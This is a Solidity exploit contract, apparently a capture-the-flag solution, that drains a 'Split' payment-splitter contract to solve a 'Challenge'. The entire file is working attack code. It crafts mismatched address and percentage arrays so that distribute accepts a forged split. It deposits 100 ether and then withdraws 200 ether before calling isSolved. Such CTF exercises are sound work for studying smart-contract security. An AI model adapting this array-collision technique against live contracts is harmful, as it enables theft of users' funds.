// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract Exploit {
    Challenge public chall;
    Split public split;
    IERC20 public Ether;

    constructor() payable {
        chall = Challenge(address(0x829Ac0Cf154d1E7014a3487439F06CFd9C501757));
        split = Split(payable(address(0x475C7669cDA4f5FF8be1227daC4d105E067fDcdD)));

        address[] memory victim = new address[](2);
        victim[0] = address(0x000000000000000000000000000000000000bEEF);
        victim[1] = address(0x0000000000000000000000000000000000000000);

        uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        split.distribute(0, victim, percents, uint32(0), Ether);

        address[] memory attacker_address = new address[](2);
        uint32[] memory attacker_percents = new uint32[](2);

        attacker_address[0] = address(this);
        attacker_address[1] = address(0x10000000);
        attacker_percents[0] = 0;
        attacker_percents[1] = 1e6;

        split.createSplit(attacker_address, attacker_percents, uint32(0));

        Split.SplitData memory splitData = split.splitsById(1);
        splitData.wallet.deposit{value: 100 ether}();

        address[] memory exploit1 = new address[](1);
        exploit1[0] = address(this);
        uint32[] memory exploit2 = new uint32[](3);

        exploit2[0] = uint32(0x10000000);
        exploit2[1] = 0;
        exploit2[2] = 1e6;

        split.distribute(1, exploit1, exploit2, uint32(0), Ether);

        IERC20[] memory token = new IERC20[](1);
        token[0] = Ether;
        uint256[] memory amount = new uint256[](1);
        amount[0] = 200 ether;
        split.withdraw(token, amount);

        chall.isSolved();
    }

    receive() external payable {}
}
